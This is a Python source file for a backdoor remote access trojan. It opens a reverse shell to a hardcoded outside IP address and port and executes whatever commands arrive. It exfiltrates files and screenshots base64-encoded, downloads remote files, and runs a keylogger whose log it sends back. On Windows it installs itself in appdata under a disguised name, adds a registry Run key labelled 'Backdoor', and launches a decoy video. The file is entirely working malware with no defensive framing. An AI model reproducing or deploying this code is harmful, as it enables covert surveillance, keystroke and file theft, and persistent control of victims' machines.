#!/usr/bin/python

import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import platform
import ctypes
import threading
import keylogger
from mss import mss

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\Windows'), 'temp']))
	except:
		admin = False
	else:
		admin = True

def snapshot():
	with mss() as screenshot:
		screenshot.shot()

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def connection():
	while True:
		time.sleep(5)
		try:
			sock.connect(("176.186.179.158", 14228))
			shell()
		except:
			connection()

def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif command == "help":
			help_options = '''                                        download path	-> Download a file from target PC
					  upload path	-> Upload a file to target PC
					  get url	-> Download a file from a specified url
					  start path	-> Start program on target PC
					  screenshot	-> Take a screenshot of the target PC
					  check		-> Check for admin rights '''
			reliable_send(help_options)
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				result = reliable_recv()
				fin.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded!!")
			except:
				reliable_send("[!!] Failed to download file")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started!")
			except:
				reliable_send("[!!] Failed to start!")
		elif command[:10] == "screenshot":
			try:
				snapshot()
				with open("monitor-1.png", "rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!] Failed to take screenshot")
		elif command[:5] == "check":
			is_admin()
			if admin == True:
				reliable_send("Admin privilege")
			else:
				reliable_send("Not Admin")
		elif command[:12] == "keylog_start":
			tl = threading.Thread(target=keylogger.start)
			tl.start()
		elif command[:11] == "keylog_dump":
			try:
				fn = open(keylogger_path, "r")
				reliable_send(fn.read())
				fn.close()
			except:
				reliable_send("Failed to dump keylogger")
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result) 
			except:
				reliable_send("[!!!] Cannot execute that command...")

if platform.system() == "Linux":
	keylogger_path = "keylogger.txt"
else:
	keylogger_path = os.environ["appdata"] + "\\windows.txt"
	location = os.environ["appdata"] + "\\windows32.exe"
	if not os.path.exists(location):
		shutil.copyfile(sys.executable, location)
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

		name = sys._MEIPASS + "\video.mp4"
		try:
			subprocess.Popen(name, shell=True)
		except:
			print("Failed")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()
